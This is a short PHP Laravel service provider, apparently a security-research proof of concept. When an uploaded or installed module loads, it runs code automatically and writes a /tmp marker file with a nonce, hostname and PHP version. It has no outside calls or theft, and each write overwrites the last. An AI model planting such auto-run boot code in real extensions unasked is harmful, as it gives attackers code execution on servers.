<?php

namespace App\Extensions\SecurityResearch\MaliciousPoc;

use Illuminate\Support\ServiceProvider as LaravelServiceProvider;
use Illuminate\Support\Facades\Log;

class SecurityResearchMaliciousPocModule extends LaravelServiceProvider
{
    public function register()
    {
        Log::info('[SecurityResearchMaliciousPocModule] Registered');
    }

    public function boot()
    {
        Log::info('[SecurityResearchMaliciousPocModule] Booting - RCE PoC');

        $markerPath = '/tmp/g7_poc_marker_' . uniqid() . '.txt';
        $nonce = bin2hex(random_bytes(8));

        file_put_contents($markerPath, "G7_RCE_POC_DEMONSTRATED: {$nonce}\n");
        file_put_contents($markerPath, "Timestamp: " . date('Y-m-d H:i:s') . "\n");
        file_put_contents($markerPath, "Server: " . gethostname() . "\n");
        file_put_contents($markerPath, "PHP Version: " . PHP_VERSION . "\n");

        Log::info("[SecurityResearchMaliciousPocModule] Marker written: {$markerPath}");
    }
}
